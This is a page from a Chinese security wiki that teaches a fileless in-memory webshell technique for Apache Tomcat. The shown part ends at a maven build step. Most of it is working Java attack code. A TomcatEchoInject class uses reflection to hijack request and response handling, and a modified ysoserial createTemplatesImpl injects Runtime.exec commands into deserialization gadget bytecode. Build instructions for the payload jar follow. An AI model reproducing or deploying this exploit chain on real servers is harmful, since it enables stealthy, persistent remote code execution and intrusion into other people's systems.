<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Tomcat/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%20%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>基于Tomcat的内存Webshell 无文件攻击技术 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u57fa\u4e8eTomcat\u7684\u5185\u5b58Webshell \u65e0\u6587\u4ef6\u653b\u51fb\u6280\u672f", url: "#_top", children: [
              {title: "0x01 tomcat\u901a\u7528\u7684\u83b7\u53d6request\u548cresponse", url: "#0x01-tomcatrequestresponse" },
              {title: "0x02 \u52a8\u6001\u6ce8\u518cFilter", url: "#0x02-filter" },
              {title: "0x03 \u6d4b\u8bd5", url: "#0x03" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-link">
        通过jmx攻击Tomcat
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Tomcat%E6%A0%B7%E4%BE%8B%E7%9B%AE%E5%BD%95session%E6%93%8D%E7%BA%B5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Tomcat%E6%A0%B7%E4%BE%8B%E7%9B%AE%E5%BD%95session%E6%93%8D%E7%BA%B5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Tomcat样例目录session操纵漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="tomcatwebshell">基于Tomcat的内存Webshell 无文件攻击技术<a class="headerlink" href="#tomcatwebshell" title="Permanent link">&para;</a></h1>
<h2 id="0x01-tomcatrequestresponse">0x01 tomcat通用的获取request和response<a class="headerlink" href="#0x01-tomcatrequestresponse" title="Permanent link">&para;</a></h2>
<p>首先我们看看一个普通http请求进来的时候，tomcat的部分执行栈：</p>
<div class="codehilite"><pre><span></span><code>at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)
at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)
at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)
at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)
at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
at java.lang.Thread.run(Thread.java:745)
</code></pre></div>

<p>按照kingkk师傅的方法，利用的点是在
org.apache.catalina.core.ApplicationFilterChain.internalDoFilter：</p>
<div class="codehilite"><pre><span></span><code>if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
    lastServicedRequest.set(request);
    lastServicedResponse.set(response);
}
</code></pre></div>

<p>其中，通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化，之后，每次请求进来，就能通过这两个ThreadLocal获取到相应的request和response了。但是，也存在一点小限制，在其set之前，看：</p>
<div class="codehilite"><pre><span></span><code>private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
    throws IOException, ServletException {

    // Call the next filter if there is one
    if (pos &lt; n) {
        ApplicationFilterConfig filterConfig = filters[pos++];
        try {
            Filter filter = filterConfig.getFilter();

            if (request.isAsyncSupported() &amp;&amp; &quot;false&quot;.equalsIgnoreCase(
                    filterConfig.getFilterDef().getAsyncSupported())) {
                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
            }
            if( Globals.IS_SECURITY_ENABLED ) {
                final ServletRequest req = request;
                final ServletResponse res = response;
                Principal principal =
                    ((HttpServletRequest) req).getUserPrincipal();

                Object[] args = new Object[]{req, res, this};
                SecurityUtil.doAsPrivilege (&quot;doFilter&quot;, filter, classType, args, principal);
            } else {
                filter.doFilter(request, response, this);
            }
        } catch (IOException | ServletException | RuntimeException e) {
            throw e;
        } catch (Throwable e) {
            e = ExceptionUtils.unwrapInvocationTargetException(e);
            ExceptionUtils.handleThrowable(e);
            throw new ServletException(sm.getString(&quot;filterChain.filter&quot;), e);
        }
        return;
    }

    // We fell off the end of the chain -- call the servlet instance
    try {
        if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
            lastServicedRequest.set(request);
            lastServicedResponse.set(response);
        }
        ...
    } catch (IOException | ServletException | RuntimeException e) {
        throw e;
    } catch (Throwable e) {
        e = ExceptionUtils.unwrapInvocationTargetException(e);
        ExceptionUtils.handleThrowable(e);
        throw new ServletException(sm.getString(&quot;filterChain.servlet&quot;), e);
    } finally {
        if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
            lastServicedRequest.set(null);
            lastServicedResponse.set(null);
        }
    }
}
</code></pre></div>

<p>先执行完所有的Filter了<code>filter.doFilter(request, response, this)</code></p>
<p>因此，对于shiro的反序列化利用就没办法通过这种方式取到response回显了。</p>
<h2 id="0x02-filter">0x02 动态注册Filter<a class="headerlink" href="#0x02-filter" title="Permanent link">&para;</a></h2>
<p>没错的，正如标题所说，通过动态注册一个Filter，并且把其放到最前面，这样，我们的Filter就能最先执行了，并且也成为了一个内存Webshell了。</p>
<p>要实现动态注册Filter，需要两个步骤。第一个步骤就是先达到能获取request和response，而第二个步骤是通过request或者response去动态注册Filter</p>
<h4 id="_1">步骤一<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
<p>首先，我们创建一个继承AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）的TomcatEchoInject类，在其静态代码块中<code>反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化</code></p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span>

<span class="o">/**</span>
 <span class="o">*</span> <span class="nd">@author</span> <span class="n">threedr3am</span>
 <span class="o">*/</span>
<span class="n">public</span> <span class="k">class</span><span class="w"> </span><span class="nc">TomcatEchoInject</span>  <span class="n">extends</span> <span class="n">AbstractTranslet</span> <span class="p">{</span>

  <span class="n">static</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="o">/*</span><span class="n">刚开始反序列化后执行的逻辑</span><span class="o">*/</span>
      <span class="o">//</span><span class="n">修改</span> <span class="n">WRAP_SAME_OBJECT</span> <span class="n">值为</span> <span class="n">true</span>
      <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span><span class="p">);</span>
      <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;WRAP_SAME_OBJECT&quot;</span><span class="p">);</span>
      <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Field</span> <span class="n">modifiersField</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;modifiers&quot;</span><span class="p">);</span>
      <span class="n">modifiersField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
      <span class="n">modifiersField</span><span class="o">.</span><span class="n">setInt</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">.</span><span class="n">getModifiers</span><span class="p">()</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Modifier</span><span class="o">.</span><span class="n">FINAL</span><span class="p">);</span>
      <span class="n">f</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="err">!</span><span class="n">f</span><span class="o">.</span><span class="n">getBoolean</span><span class="p">(</span><span class="n">null</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">f</span><span class="o">.</span><span class="n">setBoolean</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">true</span><span class="p">);</span>
      <span class="p">}</span>

      <span class="o">//</span><span class="n">初始化</span> <span class="n">lastServicedRequest</span>
      <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span><span class="p">);</span>
      <span class="n">f</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;lastServicedRequest&quot;</span><span class="p">);</span>
      <span class="n">modifiersField</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;modifiers&quot;</span><span class="p">);</span>
      <span class="n">modifiersField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
      <span class="n">modifiersField</span><span class="o">.</span><span class="n">setInt</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">.</span><span class="n">getModifiers</span><span class="p">()</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Modifier</span><span class="o">.</span><span class="n">FINAL</span><span class="p">);</span>
      <span class="n">f</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">null</span><span class="p">)</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">f</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">new</span> <span class="n">ThreadLocal</span><span class="p">());</span>
      <span class="p">}</span>

      <span class="o">//</span><span class="n">初始化</span> <span class="n">lastServicedResponse</span>
      <span class="n">f</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;lastServicedResponse&quot;</span><span class="p">);</span>
      <span class="n">modifiersField</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getDeclaredField</span><span class="p">(</span><span class="s2">&quot;modifiers&quot;</span><span class="p">);</span>
      <span class="n">modifiersField</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
      <span class="n">modifiersField</span><span class="o">.</span><span class="n">setInt</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">.</span><span class="n">getModifiers</span><span class="p">()</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">reflect</span><span class="o">.</span><span class="n">Modifier</span><span class="o">.</span><span class="n">FINAL</span><span class="p">);</span>
      <span class="n">f</span><span class="o">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="n">true</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">null</span><span class="p">)</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">f</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">new</span> <span class="n">ThreadLocal</span><span class="p">());</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="ne">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">e</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="nd">@Override</span>
  <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">SerializationHandler</span><span class="p">[]</span> <span class="n">handlers</span><span class="p">)</span> <span class="n">throws</span> <span class="n">TransletException</span> <span class="p">{</span>

  <span class="p">}</span>

  <span class="nd">@Override</span>
  <span class="n">public</span> <span class="n">void</span> <span class="n">transform</span><span class="p">(</span><span class="n">DOM</span> <span class="n">document</span><span class="p">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="p">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="p">)</span>
      <span class="n">throws</span> <span class="n">TransletException</span> <span class="p">{</span>

  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>接着，我们改造一下ysoserial中的Gadgets.createTemplatesImpl方法</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">createTemplatesImpl</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">command</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">createTemplatesImpl</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">createTemplatesImpl</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Boolean</span><span class="o">.</span><span class="n">parseBoolean</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">getProperty</span><span class="p">(</span><span class="s2">&quot;properXalan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;false&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">createTemplatesImpl</span><span class="p">(</span>
<span class="w">            </span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="p">,</span>
<span class="w">            </span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span><span class="p">),</span>
<span class="w">            </span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span><span class="p">),</span>
<span class="w">            </span><span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">createTemplatesImpl</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="k">class</span><span class="p">,</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="k">class</span><span class="p">,</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="o">.</span><span class="k">class</span><span class="p">);</span>
<span class="p">}</span>


<span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">createTemplatesImpl</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">tplClass</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;</span><span class="err">?</span><span class="o">&gt;</span><span class="w"> </span><span class="n">abstTranslet</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;</span><span class="err">?</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transFactory</span><span class="w"> </span><span class="p">)</span>
<span class="w">        </span><span class="n">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tplClass</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>
<span class="w">    </span><span class="n">final</span><span class="w"> </span><span class="n">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">classBytes</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="n">gadget</span><span class="w"> </span><span class="k">class</span>
<span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="o">.</span><span class="n">getDefault</span><span class="p">();</span>
<span class="w">        </span><span class="n">pool</span><span class="o">.</span><span class="n">insertClassPath</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">ClassClassPath</span><span class="p">(</span><span class="n">StubTransletPayload</span><span class="o">.</span><span class="k">class</span><span class="p">));</span>
<span class="w">        </span><span class="n">pool</span><span class="o">.</span><span class="n">insertClassPath</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="n">ClassClassPath</span><span class="p">(</span><span class="n">abstTranslet</span><span class="p">));</span>
<span class="w">        </span><span class="n">final</span><span class="w"> </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">StubTransletPayload</span><span class="o">.</span><span class="k">class</span><span class="o">.</span><span class="n">getName</span><span class="p">());</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">initializer</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">TODO</span><span class="p">:</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">fun</span><span class="w"> </span><span class="n">things</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">injecting</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">pure</span><span class="o">-</span><span class="n">java</span><span class="w"> </span><span class="n">rev</span><span class="o">/</span><span class="n">bind</span><span class="o">-</span><span class="n">shell</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="n">naive</span><span class="w"> </span><span class="n">protections</span>
<span class="w">        </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;java.lang.Runtime.getRuntime().exec(</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">+</span>
<span class="w">            </span><span class="n">command</span><span class="o">.</span><span class="n">replaceAll</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\\\\\\\\</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">replaceAll</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\\\&quot;</span><span class="s2">&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span>
<span class="w">            </span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">);&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="n">clazz</span><span class="o">.</span><span class="n">makeClassInitializer</span><span class="p">()</span><span class="o">.</span><span class="n">insertAfter</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">sortarandom</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">allow</span><span class="w"> </span><span class="n">repeated</span><span class="w"> </span><span class="n">exploitation</span><span class="w"> </span><span class="p">(</span><span class="n">watch</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">PermGen</span><span class="w"> </span><span class="n">exhaustion</span><span class="p">)</span>
<span class="w">        </span><span class="n">clazz</span><span class="o">.</span><span class="n">setName</span><span class="p">(</span><span class="s2">&quot;ysoserial.Pwner&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">System</span><span class="o">.</span><span class="n">nanoTime</span><span class="p">());</span>
<span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">superC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">abstTranslet</span><span class="o">.</span><span class="n">getName</span><span class="p">());</span>
<span class="w">        </span><span class="n">clazz</span><span class="o">.</span><span class="n">setSuperclass</span><span class="p">(</span><span class="n">superC</span><span class="p">);</span>
<span class="w">        </span><span class="n">classBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="o">.</span><span class="n">toBytecode</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">classBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassFiles</span><span class="o">.</span><span class="n">classAsBytes</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>


<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">inject</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">instance</span>
<span class="w">    </span><span class="n">Reflections</span><span class="o">.</span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_bytecodes&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">byte</span><span class="p">[][]</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">classBytes</span><span class="p">,</span><span class="w"> </span><span class="n">ClassFiles</span><span class="o">.</span><span class="n">classAsBytes</span><span class="p">(</span><span class="n">Foo</span><span class="o">.</span><span class="k">class</span><span class="p">)</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">happy</span>
<span class="w">    </span><span class="n">Reflections</span><span class="o">.</span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_name&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Pwnr&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">Reflections</span><span class="o">.</span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_tfactory&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">transFactory</span><span class="o">.</span><span class="n">newInstance</span><span class="p">());</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">templates</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>可以看到，第二个传入的Class参数，我们并没有用到javassist，而是直接转字节数组，然后放到TemplatesImpl实例的_bytecodes字段中了。</p>
<p>最后，回到ysoserial中有调用Gadgets.createTemplatesImpl的payload类中来，我这边对每一个都做了拷贝修改，例如CommonsCollections11，我拷贝其修改后的类为CommonsCollections11ForTomcatEchoInject，在调用<code>Gadgets.createTemplatesImpl(command[0];</code>的地方，改成了<code>final Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);</code></p>
<p>并且，对ysoserial的main入口做一点小修改，因为原来的代码规定必须要有payload的入参，而我们这里不需要了</p>
<p>ysoserial.GeneratePayload#main：</p>
<div class="codehilite"><pre><span></span><code>if (args.length &lt; 1) {
    printUsage();
    System.exit(USAGE_CODE);
}
</code></pre></div>

<p>在ysoserial执行maven指令生成jar包</p>
<div class="codehilite"><pre><span></span><code>mvn clean -Dmaven.test.skip=true compile assembly:assembly
</code></pre></div>

